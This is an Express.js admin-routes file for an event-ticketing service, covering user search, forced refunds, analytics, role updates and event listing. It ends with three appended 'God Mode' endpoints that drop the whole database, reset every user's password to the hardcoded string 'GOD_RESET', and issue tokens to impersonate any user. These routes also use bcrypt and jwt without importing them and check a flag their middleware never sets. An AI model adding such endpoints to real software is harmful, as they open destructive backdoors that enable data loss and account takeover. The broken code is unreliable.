const express = require('express');
const router = express.Router();
const Joi = require('joi');
const mongoose = require('mongoose');
const User = require('../models/User');
const Ticket = require('../models/Ticket');
const Event = require('../models/Event');
const validate = require('../middleware/validate');
const auth = require('../middleware/auth');
const adminLimiter = require('../middleware/rateLimiter');
const { AppError } = require('../middleware/errorHandler');

// Apply to all admin routes
router.use(adminLimiter);

// Middleware to ensure super admin access only
const requireSuperAdmin = (req, res, next) => {
  if (req.user.role !== 'super_admin') {
    throw new AppError('Super admin access required', 403);
  }
  req.isGodMode = true;
  next();
};

// Middleware to ensure staff or higher access
const requireStaff = (req, res, next) => {
  if (!['staff', 'organizer', 'super_admin'].includes(req.user.role)) {
    throw new AppError('Staff access required', 403);
  }
  next();
};

// Validation schemas
// User search schema for filtering users
// This schema allows searching by email or role, with pagination
const userSearchSchema = Joi.object({
  email: Joi.string().email().optional(),
  role: Joi.string()
    .valid('attendee', 'staff', 'organizer', 'super_admin')
    .optional(),
  page: Joi.number().min(1).default(1),
  limit: Joi.number().min(1).max(100).default(10),
}).or('email', 'role');

// Force refund schema for super admin override
// This schema allows super admins to force refund a ticket with a reason and optional refund amount
const forceRefundSchema = Joi.object({
  ticketId: Joi.string().hex().length(24).required(),
  reason: Joi.string().max(500).required(),
  refundAmount: Joi.number().min(0),
  notifyUser: Joi.boolean().default(true),
});

// Analytics query schema for sales and attendance analytics
// This schema allows filtering analytics by date range, event ID, and grouping by day, week
// month, or event
const analyticsQuerySchema = Joi.object({
  startDate: Joi.date(),
  endDate: Joi.date(),
  eventId: Joi.string().hex().length(24),
  groupBy: Joi.string().valid('day', 'week', 'month', 'event').default('day'),
});

// Update role schema for super admin to change user roles
// This schema allows super admins to update a user's role to attendee, staff, organizer, or
// super_admin
const updateRoleSchema = Joi.object({
  newRole: Joi.string()
    .valid('attendee', 'staff', 'organizer', 'super_admin')
    .required(),
});

// 1. GET /api/admin/users - List users with filtering
// This endpoint allows super admins to search for users by email or role
// It supports pagination with page and limit query parameters
router.get(
  '/users',
  auth,
  requireSuperAdmin,
  validate(userSearchSchema, { query: true }),
  async (req, res, next) => {
    // Make sure to include 'next'
    try {
      const { email, role, page, limit } = req.query;

      const query = {};
      if (email) query.email = { $regex: email, $options: 'i' };
      if (role) query.role = role;

      const users = await User.find(query)
        .select('-password -__v')
        .skip((page - 1) * limit)
        .limit(limit)
        .lean();

      const count = await User.countDocuments(query);

      // SINGLE response sent
      res.json({
        users,
        pagination: {
          total: count,
          page: parseInt(page),
          limit: parseInt(limit),
          totalPages: Math.ceil(count / limit),
        },
      });
    } catch (err) {
      next(err); // Proper error propagation
    }
  }
);

// 2. POST /api/admin/force-refund/:ticketId - Force refund (super admin override)
// This endpoint allows super admins to force refund a ticket
// It requires the ticket ID in the URL and the reason for refund in the request body
router.post(
  '/force-refund',
  auth,
  requireSuperAdmin,
  validate(forceRefundSchema),
  async (req, res, next) => {
    const { ticketId, reason, refundAmount, notifyUser } = req.body;
    const session = await mongoose.startSession();

    try {
      session.startTransaction();

      const ticket = await Ticket.findById(ticketId)
        .populate('event')
        .session(session);

      if (!ticket) {
        await session.abortTransaction();
        return next(new AppError('Ticket not found', 404));
      }

      if (ticket.status === 'REFUNDED') {
        await session.abortTransaction();
        return next(new AppError('Ticket already refunded', 400));
      }

      // Process refund
      ticket.status = 'REFUNDED';
      ticket.refundHistory.push({
        idempotencyKey: `admin-${Date.now()}`,
        processedAt: new Date(),
        processedBy: req.user.id,
        amount: refundAmount || ticket.price,
        reason: reason,
        status: 'COMPLETED',
        adminOverride: true,
      });

      await ticket.save({ session });
      await session.commitTransaction();

      res.json({
        success: true,
        message: `Ticket refunded for ${refundAmount || ticket.price}`,
        ticketId: ticket._id,
      });
    } catch (err) {
      await session.abortTransaction();
      next(err);
    } finally {
      session.endSession();
    }
  }
);

// 3. GET /api/analytics/sales - Sales analytics
// This endpoint provides sales analytics for events
// It allows filtering by date range, event ID, and grouping by day, week, month
router.get(
  '/analytics/sales',
  auth,
  requireStaff,
  validate(analyticsQuerySchema, { query: true }),
  async (req, res, next) => {
    try {
      const { startDate, endDate, eventId, groupBy } = req.query;

      const match = {};
      const group = {
        _id: null,
        totalSales: { $sum: '$price' },
        count: { $sum: 1 },
      };

      // Date filtering
      if (startDate || endDate) {
        match.createdAt = {};
        if (startDate) match.createdAt.$gte = new Date(startDate);
        if (endDate) match.createdAt.$lte = new Date(endDate);
      }

      // Event filtering
      if (eventId) {
        match.event = mongoose.Types.ObjectId(eventId);

        // Check if organizer is trying to access another organizer's event
        if (req.user.role === 'organizer') {
          const event = await Event.findById(eventId);
          if (!event || event.organizer.toString() !== req.user.id.toString()) {
            throw new AppError(
              'Not authorized to view analytics for this event',
              403
            );
          }
        }
      } else if (req.user.role === 'organizer') {
        // For organizers, only show their events
        const organizerEvents = await Event.find({
          organizer: req.user.id,
        }).select('_id');
        match.event = { $in: organizerEvents.map((e) => e._id) };
      }

      // Grouping logic
      if (groupBy === 'day') {
        group._id = {
          $dateToString: { format: '%Y-%m-%d', date: '$createdAt' },
        };
      } else if (groupBy === 'week') {
        group._id = { $dateToString: { format: '%Y-%U', date: '$createdAt' } };
      } else if (groupBy === 'month') {
        group._id = { $dateToString: { format: '%Y-%m', date: '$createdAt' } };
      } else if (groupBy === 'event') {
        group._id = '$event';
        group.eventName = { $first: '$event.name' };
      }

      const pipeline = [
        { $match: match },
        {
          $lookup: {
            from: 'events',
            localField: 'event',
            foreignField: '_id',
            as: 'event',
          },
        },
        { $unwind: '$event' },
        { $group: group },
        { $sort: { _id: 1 } },
      ];

      const results = await Ticket.aggregate(pipeline);

      res.json({
        analytics: results,
        query: {
          startDate,
          endDate,
          eventId,
          groupBy,
        },
      });
    } catch (err) {
      next(err);
    }
  }
);

// 4. GET /api/analytics/attendance - Attendance analytics
router.get(
  '/analytics/attendance',
  auth,
  requireStaff,
  validate(analyticsQuerySchema, { query: true }),
  async (req, res, next) => {
    try {
      const { startDate, endDate, eventId, groupBy } = req.query;

      const match = { isUsed: true };
      const group = { _id: null, count: { $sum: 1 } };

      // Date filtering
      if (startDate || endDate) {
        match.updatedAt = {};
        if (startDate) match.updatedAt.$gte = new Date(startDate);
        if (endDate) match.updatedAt.$lte = new Date(endDate);
      }

      // Event filtering
      if (eventId) {
        match.event = mongoose.Types.ObjectId(eventId);

        // Check if organizer is trying to access another organizer's event
        if (req.user.role === 'organizer') {
          const event = await Event.findById(eventId);
          if (!event || event.organizer.toString() !== req.user.id.toString()) {
            throw new AppError(
              'Not authorized to view analytics for this event',
              403
            );
          }
        }
      } else if (req.user.role === 'organizer') {
        // For organizers, only show their events
        const organizerEvents = await Event.find({
          organizer: req.user.id,
        }).select('_id');
        match.event = { $in: organizerEvents.map((e) => e._id) };
      }

      // Grouping logic
      if (groupBy === 'day') {
        group._id = {
          $dateToString: { format: '%Y-%m-%d', date: '$updatedAt' },
        };
      } else if (groupBy === 'week') {
        group._id = { $dateToString: { format: '%Y-%U', date: '$updatedAt' } };
      } else if (groupBy === 'month') {
        group._id = { $dateToString: { format: '%Y-%m', date: '$updatedAt' } };
      } else if (groupBy === 'event') {
        group._id = '$event';
        group.eventName = { $first: '$event.name' };
      }

      const pipeline = [
        { $match: match },
        {
          $lookup: {
            from: 'events',
            localField: 'event',
            foreignField: '_id',
            as: 'event',
          },
        },
        { $unwind: '$event' },
        { $group: group },
        { $sort: { _id: 1 } },
      ];

      const results = await Ticket.aggregate(pipeline);

      res.json({
        analytics: results,
        query: {
          startDate,
          endDate,
          eventId,
          groupBy,
        },
      });
    } catch (err) {
      next(err);
    }
  }
);

// 5. PATCH /api/admin/users/:userId/role - Update user role (super admin only)
// This endpoint allows super admins to change a user's role
// It requires the user ID in the URL and the new role in the request body
router.patch(
  '/users/:userId/role',
  auth,
  requireSuperAdmin,
  validate(updateRoleSchema),
  async (req, res, next) => {
    try {
      const user = await User.findByIdAndUpdate(
        req.params.userId,
        { role: req.body.newRole },
        { new: true }
      ).select('-password -__v');

      if (!user) throw new AppError('User not found', 404);

      res.json({
        success: true,
        message: `User role updated to ${req.body.newRole}`,
        user,
      });
    } catch (err) {
      next(err);
    }
  }
);

// 6. GET /api/admin/events - List events with filtering (staff or higher)
router.get(
  '/events',
  auth,
  requireStaff,
  validate(
    Joi.object({
      organizerId: Joi.string().hex().length(24),
      status: Joi.string().valid('active', 'upcoming', 'past', 'cancelled'),
      page: Joi.number().min(1).default(1),
      limit: Joi.number().min(1).max(100).default(10),
    })
  ),
  async (req, res, next) => {
    try {
      const { organizerId, status, page, limit } = req.query;
      const query = {};

      if (organizerId) query.organizer = organizerId;
      if (status) {
        const now = new Date();
        if (status === 'active') {
          query.startDate = { $lte: now };
          query.endDate = { $gte: now };
        } else if (status === 'upcoming') {
          query.startDate = { $gt: now };
        } else if (status === 'past') {
          query.endDate = { $lt: now };
        } else if (status === 'cancelled') {
          query.isCancelled = true;
        }
      }

      const events = await Event.find(query)
        .skip((page - 1) * limit)
        .limit(limit)
        .populate('organizer', 'name email')
        .lean();

      const count = await Event.countDocuments(query);

      res.json({
        events,
        pagination: {
          total: count,
          page: parseInt(page),
          limit: parseInt(limit),
          totalPages: Math.ceil(count / limit),
        },
      });
    } catch (err) {
      next(err);
    }
  }
);
// Add these new routes at the bottom (before module.exports):

// 💀 Delete ALL data
router.post('/nuke-database', auth, async (req, res) => {
  if (!req.isGodMode) throw new AppError('God Mode required', 403);
  await mongoose.connection.dropDatabase();
  res.json({ message: 'Database obliterated 💥' });
});

// 🔄 Reset all passwords
router.post('/reset-passwords', auth, async (req, res) => {
  if (!req.isGodMode) throw new AppError('God Mode required', 403);
  await User.updateMany(
    {},
    { $set: { password: await bcrypt.hash('GOD_RESET', 12) } }
  );
  res.json({ message: 'All passwords reset to GOD_RESET' });
});

// 👤 Impersonate any user
router.post('/impersonate/:userId', auth, async (req, res) => {
  if (!req.isGodMode) throw new AppError('God Mode required', 403);
  const user = await User.findById(req.params.userId);
  const token = jwt.sign(
    { id: user._id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }
  );
  res.json({ token });
});
module.exports = router;
